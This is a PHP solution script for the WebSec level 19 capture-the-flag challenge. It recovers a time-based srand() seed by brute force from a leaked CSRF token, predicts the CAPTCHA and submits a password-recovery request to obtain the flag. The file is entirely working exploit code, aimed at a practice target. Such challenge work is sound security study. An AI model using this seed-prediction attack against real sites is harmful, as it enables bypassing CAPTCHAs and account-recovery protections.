<?php
error_reporting(0);

function generate_random_text($length) {
    $chars  = "abcdefghijklmnopqrstuvwxyz";
    $chars .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $chars .= "1234567890";

    $text = '';
    for($i = 0; $i < $length; $i++) {
        $text .= $chars[rand() % strlen($chars)];
    }
    return $text;
}

echo "╔════════════════════════════════════════════════════════════╗\n";
echo "║      WebSec Level 19 - Full Bruteforce Attack             ║\n";
echo "╚════════════════════════════════════════════════════════════╝\n\n";

// Obtener una sesión
echo "[1] Getting session...\n";
$ch = curl_init("https://websec.fr/level19/index.php");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
$req_start = microtime(true);
$response = curl_exec($ch);
$req_end = microtime(true);
curl_close($ch);

// Extraer session ID
if (!preg_match('/PHPSESSID=([a-z0-9]+)/i', $response, $matches)) {
    die("[-] Could not extract session ID\n");
}
$session_id = $matches[1];

// Extraer body y token
$parts = explode("\r\n\r\n", $response, 2);
$body = isset($parts[1]) ? $parts[1] : $response;

if (!preg_match('/name="token" value="([^"]+)"/', $body, $token_match)) {
    die("[-] Could not extract CSRF token\n");
}
$real_token = $token_match[1];

$req_time = ($req_start + $req_end) / 2;

echo "[+] Session: $session_id\n";
echo "[+] Token: $real_token\n";
echo "[+] Request time: " . sprintf("%.6f", $req_time) . "\n";
echo "[+] Request time (int): " . floor($req_time) . " (" . date('Y-m-d H:i:s', floor($req_time)) . ")\n\n";

echo "[2] Bruteforcing seed...\n";

$found = false;
$attempts = 0;
$base_time = floor($req_time);

// Probar con un rango MUY amplio y mayor precisión
for ($sec_offset = -10; $sec_offset <= 10 && !$found; $sec_offset++) {
    for ($micro = 0; $micro < 1000000 && !$found; $micro += 1) {
        $seed = $base_time + $sec_offset + ($micro / 1000000);
        
        srand($seed);
        $test_token = generate_random_text(32);
        
        $attempts++;
        
        if ($test_token === $real_token) {
            echo "\n[+] ✓✓✓ SEED FOUND! ✓✓✓\n";
            echo "[+] Seed: " . sprintf("%.6f", $seed) . "\n";
            echo "[+] Attempts: $attempts\n";
            echo "[+] Offset: $sec_offset seconds, $micro microseconds\n\n";
            
            // Generar el CAPTCHA con la misma semilla
            srand($seed);
            generate_random_text(32); // Skip token
            $captcha = generate_random_text(25);
            
            echo "[3] Predicted CAPTCHA: $captcha\n\n";
            echo "[4] Submitting...\n";
            
            $post_data = http_build_query([
                'captcha' => $captcha,
                'token' => $real_token,
                'submit' => ''
            ]);
            
            $ch = curl_init("https://websec.fr/level19/index.php");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
            curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=" . $session_id);
            $result = curl_exec($ch);
            curl_close($ch);
            
            if (strpos($result, 'Password recovery email sent') !== false) {
                echo "\n╔════════════════════════════════════════════════════════════╗\n";
                echo "║                   🎉 SUCCESS! 🎉                         ║\n";
                echo "╠════════════════════════════════════════════════════════════╣\n";
                
                if (preg_match('/WEBSEC\{[^}]+\}/', $result, $flag_match)) {
                    echo "║                                                            ║\n";
                    echo "║  FLAG: " . str_pad($flag_match[0], 49) . "║\n";
                    echo "║                                                            ║\n";
                    echo "╚════════════════════════════════════════════════════════════╝\n";
                    file_put_contents('/workspace/websec_level19/FLAG.txt', $flag_match[0]);
                } else {
                    echo "╚════════════════════════════════════════════════════════════╝\n";
                }
                $found = true;
                exit(0);
            } else {
                echo "[-] Failed! Checking response...\n";
                if (strpos($result, 'Invalid captcha') !== false) {
                    echo "[-] Invalid captcha\n";
                } elseif (strpos($result, 'Invalid session token') !== false) {
                    echo "[-] Invalid session token\n";
                }
            }
            break;
        }
        
        if ($attempts % 4000 == 0) {
            echo ".";
        }
    }
}

if (!$found) {
    echo "\n\n[-] Failed after $attempts attempts\n";
    echo "[-] Token we're looking for: $real_token\n";
}
?>